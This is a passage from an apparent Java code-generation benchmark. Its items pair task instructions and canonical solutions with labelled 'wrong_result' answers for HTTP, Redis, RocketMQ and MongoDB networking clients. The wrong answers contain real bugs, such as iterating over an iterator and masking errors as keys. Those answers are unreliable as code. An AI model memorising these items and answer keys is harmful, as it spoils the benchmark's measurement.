ReceivedKey.vaultKeyAndUserKey(vaultKeyJwe, userKeyJwe);\n\t\t\t} catch (ParseException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t}\n\t\t} else {\n\t\t\tthrow new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n\t\tvar legacyAccessTokenUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/keys/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(legacyAccessTokenUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(this::handleLegacyAccessTokenResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n\t\ttry {\n\t\t\tif (response.statusCode() == 200) {\n\t\t\t\tvar token = JWEObject.parse(response.body());\n\t\t\t\treturn ReceivedKey.legacyDeviceKey(token);\n\t\t\t} else {\n\t\t\t\tthrow new IOException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException | ParseException e) {\n\t\t\tthrow new UncheckedIOException(e instanceof IOException ? (IOException) e : new IOException(e));\n\t\t}\n\t}\n\n\tprivate ReceivedKey retrievalFailed(Throwable cause) {\n\t\tthrow new RuntimeException(cause);\n\t}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record DeviceDto(@JsonProperty(value = \"userPrivateKey\", required = true) String userPrivateKey) {}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record ConfigDto(@JsonProperty(value = \"apiLevel\") int apiLevel) {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HubHttpClient {\n    private final HttpClient httpClient;\n    private final String bearerToken;\n    private final HubConfig hubConfig;\n    private final String deviceId;\n    private final String vaultId;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n        this.httpClient = HttpClient.newBuilder()\n                .executor(executor)\n                .build();\n        this.bearerToken = bearerToken;\n        this.hubConfig = hubConfig;\n        this.deviceId = deviceId;\n        this.vaultId = vaultId;\n    }\n\n    public CompletableFuture<ReceivedKey> requestApiConfig() {\n        return httpClient.sendAsync(\n                HttpRequest.newBuilder()\n                        .uri(hubConfig.getApiConfigUri())\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .GET()\n                        .build(),\n                HttpResponse.BodyHandlers.ofString()\n        ).thenCompose(this::handleApiConfigResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return CompletableFuture.completedFuture(new ReceivedKey(response.body()));\n        } else {\n            return CompletableFuture.completedFuture(retrievalFailed(new RuntimeException(\"API config request failed with status \" + response.statusCode())));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestDeviceData() {\n        return httpClient.sendAsync(\n                HttpRequest.newBuilder()\n                        .uri(hubConfig.getDeviceDataUri(deviceId))\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .GET()\n                        .build(),\n                HttpResponse.BodyHandlers.ofString()\n        ).thenCompose(this::handleDeviceDataResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return CompletableFuture.completedFuture(new ReceivedKey(response.body()));\n        } else {\n            return CompletableFuture.completedFuture(retrievalFailed(new RuntimeException(\"Device data request failed with status \" + response.statusCode())));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n        return httpClient.sendAsync(\n                HttpRequest.newBuilder()\n                        .uri(hubConfig.getVaultMasterkeyUri(vaultId))\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .POST(HttpRequest.BodyPublishers.ofString(encryptedUserKey))\n                        .build(),\n                HttpResponse.BodyHandlers.ofString()\n        ).thenCompose((HttpResponse<String> response) -> handleVaultMasterkeyResponse(encryptedUserKey, response));\n    }\n\n    private CompletableFuture<ReceivedKey> handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return CompletableFuture.completedFuture(new ReceivedKey(response.body()));\n        } else {\n            return CompletableFuture.completedFuture(retrievalFailed(new RuntimeException(\"Vault masterkey request failed with status \" + response.statusCode())));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n        return httpClient.sendAsync(\n                HttpRequest.newBuilder()\n                        .uri(hubConfig.getLegacyAccessTokenUri())\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .GET()\n                        .build(),\n                HttpResponse.BodyHandlers.ofString()\n        ).thenCompose(this::handleLegacyAccessTokenResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            return CompletableFuture.completedFuture(new ReceivedKey(response.body()));\n        } else {\n            return CompletableFuture.completedFuture(retrievalFailed(new RuntimeException(\"Legacy access token request failed with status \" + response.statusCode())));\n        }\n    }\n\n    private ReceivedKey retrievalFailed(Throwable cause) {\n        return new ReceivedKey(cause.getMessage());\n    }\n}"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a Java class that establishes and manages a non-blocking TCP client connection to a Redis server using Java NIO (New I/O) techniques. The class should handle connection establishment, data writing, reading, and resource cleanup.\n\nClass Description: PassiveRedisIndexer is a TCP client that connects to a Redis server using non-blocking I/O operations. It manages connection state, handles write operations through a queue, and reads server responses while efficiently managing system resources.\n\nAttributes:\n- writeQueue: Queue<ByteBuffer> - A thread-safe queue holding data buffers to be written to the server\n- ref: AtomicReference<SocketHandler> - Atomic reference to the current socket handler instance\n- conMan: NIOConnectionManager - Manages NIO channel registration and event selection\n- config: ConfigReader - Reads configuration data for server connection details\n- namespaces: Map<String,String> - Static map containing XML namespace definitions for configuration parsing\n\nMethods:\n- getAddress() -> InetAddress - Retrieves the Redis server address from configuration\n  - Input: None\n  - Output: InetAddress - The server address to connect to\n\nSocketHandler Inner Class:\n- chan: SocketChannel - The NIO channel for the TCP connection\n- awaitingWriteNotification: boolean - Flag indicating if write operations are pending\n- toWrite: ByteBuffer - Current buffer being written to the channel\n- oblivion: ByteBuffer - Buffer for reading server responses (discarded in this implementation)\n\nSocketHandler Methods:\n- open() -> void - Initializes and opens the socket channel in non-blocking mode\n  - Input: None\n  - Output: None\n- close() -> void - Cleans up resources and closes the connection\n  - Input: None\n  - Output: None\n- getChannel() -> SocketChannel - Returns the socket channel\n  - Input: None\n  - Output: SocketChannel - The managed socket channel\n- registrationEvent(NIOConnectionManager, SelectionKey) -> void - Handles channel registration events\n  - Input: manager (NIOConnectionManager), key (SelectionKey)\n  - Output: None\n- selectionEvent(SelectionKey) -> void - Handles channel I/O events (connect, read, write)\n  - Input: key (SelectionKey)\n  - Output: None\n- read() -> void - Reads data from the channel (into oblivion buffer)\n  - Input: None\n  - Output: None\n- doStateChecks(long) -> void - Performs periodic connection state checks\n  - Input: now (long) - current timestamp\n  - Output: None\n- calcInterestOps() -> int - Calculates current interest operations for the selector\n  - Input: None\n  - Output: int - Bitmask of interest operations (READ, WRITE, CONNECT)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Queue;\nimport java.util.concurrent.ConcurrentLinkedQueue;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.utils.ConfigReader;\nimport the8472.utils.XMLUtils;\nimport the8472.utils.concurrent.SerializedTaskExecutor;\n\npublic class PassiveRedisIndexer {\n\n    private Queue<ByteBuffer> writeQueue = new ConcurrentLinkedQueue<>();\n    private AtomicReference<SocketHandler> ref = new AtomicReference<>();\n    private NIOConnectionManager conMan;\n    private ConfigReader config;\n    private static final Map<String,String> namespaces = Map.of(\"xsi\",\"http://www.w3.org/2001/XMLSchema-instance\");\n\n    class SocketHandler implements Selectable {\n        \n        SocketChannel chan;\n        volatile boolean awaitingWriteNotification = true;\n        ByteBuffer toWrite;\n        ByteBuffer oblivion = ByteBuffer.allocateDirect(4*1024);\n        \n        void open() {\n            try {\n                chan = SocketChannel.open();\n                chan.configureBlocking(false);\n                chan.connect(new InetSocketAddress(getAddress(),6379));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            \n            conMan.register(this);\n        }\n        \n        void close() {\n            writeQueue.clear();\n            ref.compareAndSet(this, null);\n            try {\n                chan.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    \n        @Override\n        public SocketChannel getChannel() {\n            return chan;\n        }\n    \n        @Override\n        public void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n        \n        @Override\n        public void selectionEvent(SelectionKey key) throws IOException {\n            if(key.isValid() && key.isConnectable()) {\n                chan.finishConnect();\n                conMan.interestOpsChanged(this);\n            }\n                \n            if(key.isValid() && key.isReadable())\n                read();\n            if(key.isValid() && key.isWritable()) {\n                awaitingWriteNotification = false;\n                tryWrite.run();\n                conMan.interestOpsChanged(this);\n            }\n        }\n        \n        Runnable tryWrite = SerializedTaskExecutor.onceMore(() -> {\n            while(!awaitingWriteNotification && !writeQueue.isEmpty()) {\n                if(toWrite == null)\n                    toWrite = writeQueue.poll();\n                if(toWrite == null)\n                    continue;\n                \n                int written = 0;\n                try {\n                    written = chan.write(toWrite);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n                \n                if(written < 0) {\n                    awaitingWriteNotification = true;\n                    close();\n                    continue;\n                }\n                \n                if(toWrite.remaining() > 0) {\n                    awaitingWriteNotification = true;\n                    conMan.interestOpsChanged(this);\n                } else {\n                    toWrite = null;\n                }\n            }\n        });\n        \n        void read() throws IOException {\n            while(true) {\n                oblivion.clear();\n                int read = chan.read(oblivion);\n                if(read < 0)\n                    close();\n                if(read <= 0)\n                    break;\n            }\n        }\n    \n        @Override\n        public void doStateChecks(long now) throws IOException {\n            if(!chan.isOpen()) {\n                close();\n                conMan.deRegister(this);\n            }\n        }\n    \n        @Override\n        public int calcInterestOps() {\n            int ops = SelectionKey.OP_READ;\n            \n            if(chan.isConnectionPending())\n                ops |= SelectionKey.OP_CONNECT;\n            \n            if(awaitingWriteNotification)\n                ops |= SelectionKey.OP_WRITE;\n                \n            return ops;\n        }\n    }\n\n    private InetAddress getAddress() {\n        return config.get(XMLUtils.buildXPath(\"//components/component[@xsi:type='mldht:redisIndexerType']/address\",namespaces))\n                   .flatMap(str -> Optional.ofNullable(str))\n                   .map(str -> {\n                       try {\n                           return InetAddress.getByName(str);\n                       } catch (Exception e) {\n                           throw new RuntimeException(e);\n                       }\n                   })\n                   .get();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class PassiveRedisIndexer {\n    private final Queue<ByteBuffer> writeQueue = new LinkedBlockingQueue<>();\n    private final AtomicReference<SocketHandler> ref = new AtomicReference<>();\n    private final NIOConnectionManager conMan;\n    private final ConfigReader config;\n    private static final Map<String, String> namespaces = new HashMap<>();\n\n    public PassiveRedisIndexer(NIOConnectionManager conMan, ConfigReader config) {\n        this.conMan = conMan;\n        this.config = config;\n    }\n\n    public InetAddress getAddress() {\n        return config.getServerAddress();\n    }\n\n    private class SocketHandler {\n        private final SocketChannel chan;\n        private boolean awaitingWriteNotification;\n        private ByteBuffer toWrite;\n        private ByteBuffer oblivion;\n\n        SocketHandler() {\n            this.chan = null;\n            this.awaitingWriteNotification = false;\n            this.toWrite = ByteBuffer.allocate(1024);\n            this.oblivion = ByteBuffer.allocate(1024);\n        }\n\n        void open() {\n            try {\n                chan = SocketChannel.open();\n                chan.configureBlocking(false);\n                InetAddress address = getAddress();\n                InetSocketAddress socketAddress = new InetSocketAddress(address, config.getPort());\n                chan.connect(socketAddress);\n                conMan.registerChannel(chan);\n                SelectionKey key = chan.register(conMan.getSelector(), 0);\n                registrationEvent(conMan, key);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        void close() {\n            if (chan != null) {\n                try {\n                    chan.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        SocketChannel getChannel() {\n            return chan;\n        }\n\n        void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n            if (!chan.isConnected()) {\n                key.interestOps(SelectionKey.OP_CONNECT);\n            } else {\n                key.interestOps(SelectionKey.OP_READ | calcInterestOps());\n            }\n        }\n\n        void selectionEvent(SelectionKey key) {\n            if (key.isConnectable()) {\n                if (chan.finishConnect()) {\n                    key.interestOps(SelectionKey.OP_READ | calcInterestOps());\n                } else {\n                    // Handle connection failure\n                }\n            }\n            if (key.isReadable()) {\n                read();\n            }\n            if (key.isWritable()) {\n                write();\n            }\n        }\n\n        private void write() {\n            while (writeQueue.peek() != null) {\n                ByteBuffer buffer = writeQueue.poll();\n                int bytesWritten = chan.write(buffer);\n                if (bytesWritten == 0) {\n                    break;\n                }\n                if (bytesWritten < buffer.remaining()) {\n                    writeQueue.add(buffer);\n                    break;\n                }\n            }\n            calcInterestOps();\n        }\n\n        private void read() {\n            try {\n                int bytesRead = chan.read(oblivion);\n                if (bytesRead > 0) {\n                    oblivion.flip();\n                    oblivion.clear();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        void doStateChecks(long now) {\n            if (!chan.isConnected()) {\n                // Reconnect logic\n            }\n        }\n\n        int calcInterestOps() {\n            int ops = 0;\n            if (!writeQueue.isEmpty()) {\n                ops |= SelectionKey.OP_WRITE;\n            }\n            if (chan.isConnected()) {\n                ops |= SelectionKey.OP_READ;\n            }\n            return ops;\n        }\n    }\n}"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a Java class for a High Availability (HA) client that manages communication with a master server using non-blocking I/O (NIO) techniques. The client should handle connection management, data reporting, and read event processing.\n\nClass Description: DefaultHAClient is a service thread that maintains a connection to a master server for high availability purposes. It uses Java NIO's SocketChannel and Selector for non-blocking communication, manages buffer operations for data transfer, and handles connection lifecycle events.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Maximum buffer size for reading data (4MB)\n- masterHaAddress: [AtomicReference<String>] - Atomic reference to the master server's address\n- reportOffset: [ByteBuffer] - Buffer for reporting slave offset to master (8 bytes)\n- socketChannel: [SocketChannel] - Channel for communication with master\n- selector: [Selector] - Selector for non-blocking I/O operations\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n- lastWriteTimestamp: [long] - Timestamp of last successful write operation\n- currentReportedOffset: [long] - Current offset reported to master\n- dispatchPosition: [int] - Position in read buffer for dispatching data\n- byteBufferRead: [ByteBuffer] - Primary buffer for reading data\n- byteBufferBackup: [ByteBuffer] - Backup buffer for buffer reallocation\n- defaultMessageStore: [DefaultMessageStore] - Reference to the message store for offset information\n\nMethods:\n- DefaultHAClient([DefaultMessageStore defaultMessageStore]) -> [void] - Constructor that initializes selector and message store reference\n- updateHaMasterAddress([String newAddr]) -> [void] - Updates the master server address atomically\n- reportSlaveMaxOffset([long maxOffset]) -> [boolean] - Reports the slave's maximum offset to master, returns success status\n- reallocateByteBuffer() -> [void] - Reallocates and swaps read buffers when needed\n- swapByteBuffer() -> [void] - Swaps primary and backup byte buffers\n- processReadEvent() -> [boolean] - Processes read events from socket channel, returns success status\n- connectMaster() -> [boolean] - Connects to master server, returns connection status\n- closeMaster() -> [void] - Closes connection with master and cleans up resources\n- shutdown() -> [void] - Shuts down the client by closing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.store.DefaultMessageStore;\n\npublic class DefaultHAClient extends ServiceThread implements HAClient {\n\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024 * 4;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp = System.currentTimeMillis();\n    private long lastWriteTimestamp = System.currentTimeMillis();\n    private long currentReportedOffset = 0;\n    private int dispatchPosition = 0;\n    private ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private ByteBuffer byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.defaultMessageStore = defaultMessageStore;\n    }\n\n    public void updateHaMasterAddress(final String newAddr) {\n        String currentAddr = this.masterHaAddress.get();\n        if (masterHaAddress.compareAndSet(currentAddr, newAddr)) {\n            log.info(\"update master ha address, OLD: \" + currentAddr + \" NEW: \" + newAddr);\n        }\n    }\n\n    private boolean reportSlaveMaxOffset(final long maxOffset) {\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n        this.reportOffset.putLong(maxOffset);\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n\n        for (int i = 0; i < 3 && this.reportOffset.hasRemaining(); i++) {\n            try {\n                this.socketChannel.write(this.reportOffset);\n            } catch (IOException e) {\n                log.error(this.getServiceName()\n                    + \"reportSlaveMaxOffset this.socketChannel.write exception\", e);\n                return false;\n            }\n        }\n        lastWriteTimestamp = this.defaultMessageStore.getSystemClock().now();\n        return !this.reportOffset.hasRemaining();\n    }\n\n    private void reallocateByteBuffer() {\n        int remain = READ_MAX_BUFFER_SIZE - this.dispatchPosition;\n        if (remain > 0) {\n            this.byteBufferRead.position(this.dispatchPosition);\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferBackup.put(this.byteBufferRead);\n        }\n\n        this.swapByteBuffer();\n        this.byteBufferRead.position(remain);\n        this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        this.dispatchPosition = 0;\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer tmp = this.byteBufferRead;\n        this.byteBufferRead = this.byteBufferBackup;\n        this.byteBufferBackup = tmp;\n    }\n\n    private boolean processReadEvent() {\n        int readSizeZeroTimes = 0;\n        while (this.byteBufferRead.hasRemaining()) {\n            try {\n                int readSize = this.socketChannel.read(this.byteBufferRead);\n                if (readSize > 0) {\n                    readSizeZeroTimes = 0;\n                    boolean result = this.dispatchReadRequest();\n                    if (!result) {\n                        log.error(\"HAClient, dispatchReadRequest error\");\n                        return false;\n                    }\n                    lastReadTimestamp = System.currentTimeMillis();\n                } else if (readSize == 0) {\n                    if (++readSizeZeroTimes >= 3) {\n                        break;\n                    }\n                } else {\n                    log.info(\"HAClient, processReadEvent read socket < 0\");\n                    return false;\n                }\n            } catch (IOException e) {\n                log.info(\"HAClient, processReadEvent read socket exception\", e);\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public boolean connectMaster() throws ClosedChannelException {\n        if (null == socketChannel) {\n            String addr = this.masterHaAddress.get();\n            if (addr != null) {\n                SocketAddress socketAddress = NetworkUtil.string2SocketAddress(addr);\n                this.socketChannel = RemotingHelper.connect(socketAddress);\n                if (this.socketChannel != null) {\n                    this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n                    log.info(\"HAClient connect to master {}\", addr);\n                }\n            }\n            this.currentReportedOffset = this.defaultMessageStore.getMaxPhyOffset();\n            this.lastReadTimestamp = System.currentTimeMillis();\n        }\n        return this.socketChannel != null;\n    }\n\n    public void closeMaster() {\n        if (null != this.socketChannel) {\n            try {\n                SelectionKey sk = this.socketChannel.keyFor(this.selector);\n                if (sk != null) {\n                    sk.cancel();\n                }\n                this.socketChannel.close();\n                this.socketChannel = null;\n                log.info(\"HAClient close connection with master {}\", this.masterHaAddress.get());\n            } catch (IOException e) {\n                log.warn(\"closeMaster exception. \", e);\n            }\n            this.lastReadTimestamp = 0;\n            this.dispatchPosition = 0;\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferRead.position(0);\n            this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        super.shutdown();\n        closeMaster();\n        try {\n            this.selector.close();\n        } catch (IOException e) {\n            log.warn(\"Close the selector of AutoRecoverHAClient error, \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class DefaultHAClient implements Runnable {\n    private static final int READ_MAX_BUFFER_SIZE = 4 * 1024 * 1024;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp;\n    private long lastWriteTimestamp;\n    private long currentReportedOffset;\n    private int dispatchPosition;\n    private ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private ByteBuffer byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private final DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) {\n        this.defaultMessageStore = defaultMessageStore;\n        try {\n            selector = Selector.open();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        dispatchPosition = 0;\n    }\n\n    public void updateHaMasterAddress(String newAddr) {\n        masterHaAddress.set(newAddr);\n    }\n\n    public boolean reportSlaveMaxOffset(long maxOffset) {\n        reportOffset.putLong(maxOffset);\n        reportOffset.flip();\n        try {\n            if (socketChannel != null && socketChannel.isConnected()) {\n                int bytesWritten = socketChannel.write(reportOffset);\n                if (bytesWritten > 0) {\n                    lastWriteTimestamp = System.currentTimeMillis();\n                    currentReportedOffset = maxOffset;\n                    reportOffset.clear();\n                    return true;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    private void reallocateByteBuffer() {\n        ByteBuffer newBuffer = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        ByteBuffer temp = byteBufferRead;\n        byteBufferRead = newBuffer;\n        byteBufferBackup = temp;\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer temp = byteBufferRead;\n        byteBufferRead = byteBufferBackup;\n        byteBufferBackup = temp;\n    }\n\n    public boolean processReadEvent() {\n        if (socketChannel == null || !socketChannel.isConnected()) {\n            return false;\n        }\n        try {\n            int bytesRead = socketChannel.read(byteBufferRead);\n            if (bytesRead > 0) {\n                lastReadTimestamp = System.currentTimeMillis();\n                if (byteBufferRead.remaining() == 0) {\n                    reallocateByteBuffer();\n                }\n                return true;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    public boolean connectMaster() {\n        try {\n            String address = masterHaAddress.get();\n            if (address == null || address.isEmpty()) {\n                return false;\n            }\n            socketChannel = SocketChannel.open();\n            socketChannel.configureBlocking(false);\n            if (socketChannel.connect(new InetSocketAddress(address, 10911))) {\n                socketChannel.register(selector, SelectionKey.OP_READ | SelectionKey.OP_WRITE);\n                return true;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    public void closeMaster() {\n        if (socketChannel != null) {\n            try {\n                socketChannel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            socketChannel = null;\n        }\n    }\n\n    public void shutdown() {\n        closeMaster();\n        if (selector != null) {\n            try {\n                selector.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                selector.select();\n                if (selector.selectedKeys().isEmpty()) {\n                    continue;\n                }\n                for (SelectionKey key : selector.selectedKeys().iterator()) {\n                    if (key.isReadable()) {\n                        processReadEvent();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Create a Java class that implements asynchronous TCP client functionality using java.nio channels for non-blocking network communication, with support for connection management, socket configuration, and asynchronous I/O operations.\n\nClass Description: AsynchronousSocketChannelStream is a class that provides asynchronous TCP client functionality using Java NIO's AsynchronousSocketChannel. It handles connection establishment, socket configuration, and asynchronous read/write operations with support for connection retries and error handling.\n\nAttributes:\n- serverAddress: [ServerAddress] - The target server address to connect to\n- inetAddressResolver: [InetAddressResolver] - Resolves hostnames to IP addresses\n- settings: [SocketSettings] - Configuration for socket options and timeouts\n- group: [AsynchronousChannelGroup] - Optional channel group for resource management\n\nMethods:\n- openAsync([OperationContext operationContext], [AsyncCompletionHandler<Void> handler]) -> [void] - Initiates an asynchronous connection to the server, with completion notified via handler\n- initializeSocketChannel([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue]) -> [void] - Internal method to attempt connection to a socket address\n- OpenCompletionHandler([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue], [AsynchronousSocketChannel attemptConnectionChannel]) -> [void] - Handles connection completion/failure and manages retry logic\n- AsynchronousSocketChannelAdapter([AsynchronousSocketChannel channel]) -> [void] - Wrapper class that implements ExtendedAsynchronousByteChannel interface for I/O operations\n\nThe OpenCompletionHandler nested class provides:\n- completed([Void result], [Object attachment]) -> [void] - Handles successful connection\n- failed([Throwable exc], [Object attachment]) -> [void] - Handles connection failure and manages retries\n\nThe AsynchronousSocketChannelAdapter nested class provides:\n- Various read/write methods with timeout support -> [Future/void] - Implements asynchronous I/O operations\n- isOpen() -> [boolean] - Checks if channel is open\n- close() -> [void] - Closes the channel",
    "Canonical_solution": "import com.mongodb.MongoSocketException;\nimport com.mongodb.MongoSocketOpenException;\nimport com.mongodb.ServerAddress;\nimport com.mongodb.connection.AsyncCompletionHandler;\nimport com.mongodb.connection.SocketSettings;\nimport com.mongodb.lang.Nullable;\nimport com.mongodb.spi.dns.InetAddressResolver;\n\nimport java.io.IOException;\nimport java.net.SocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousChannelGroup;\nimport java.nio.channels.AsynchronousSocketChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport static com.mongodb.internal.connection.ServerAddressHelper.getSocketAddresses;\n\npublic final class AsynchronousSocketChannelStream extends AsynchronousChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    @Nullable\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(\n            final ServerAddress serverAddress, final InetAddressResolver inetAddressResolver,\n            final SocketSettings settings, final PowerOfTwoBufferPool bufferProvider,\n            @Nullable final AsynchronousChannelGroup group) {\n        super(serverAddress, settings, bufferProvider);\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    @Override\n    public void openAsync(final OperationContext operationContext, final AsyncCompletionHandler<Void> handler) {\n        Queue<SocketAddress> socketAddressQueue;\n\n        try {\n            socketAddressQueue = new LinkedList<>(getSocketAddresses(serverAddress, inetAddressResolver));\n        } catch (Throwable t) {\n            handler.failed(t);\n            return;\n        }\n\n        initializeSocketChannel(handler, socketAddressQueue);\n    }\n\n    private void initializeSocketChannel(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new MongoSocketException(\"Exception opening socket\", serverAddress));\n        } else {\n            SocketAddress socketAddress = socketAddressQueue.poll();\n\n            try {\n                AsynchronousSocketChannel attemptConnectionChannel;\n                attemptConnectionChannel = group == null\n                        ? AsynchronousSocketChannel.open()\n                        : AsynchronousSocketChannel.open(group);\n                attemptConnectionChannel.setOption(StandardSocketOptions.TCP_NODELAY, true);\n                attemptConnectionChannel.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n                if (settings.getReceiveBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_RCVBUF, settings.getReceiveBufferSize());\n                }\n                if (settings.getSendBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_SNDBUF, settings.getSendBufferSize());\n                }\n\n                attemptConnectionChannel.connect(socketAddress, null,\n                        new OpenCompletionHandler(handler, socketAddressQueue, attemptConnectionChannel));\n            } catch (IOException e) {\n                handler.failed(new MongoSocketOpenException(\"Exception opening socket\", serverAddress, e));\n            } catch (Throwable t) {\n                handler.failed(t);\n            }\n        }\n    }\n\n    private class OpenCompletionHandler implements CompletionHandler<Void, Object>  {\n        private final AtomicReference<AsyncCompletionHandler<Void>> 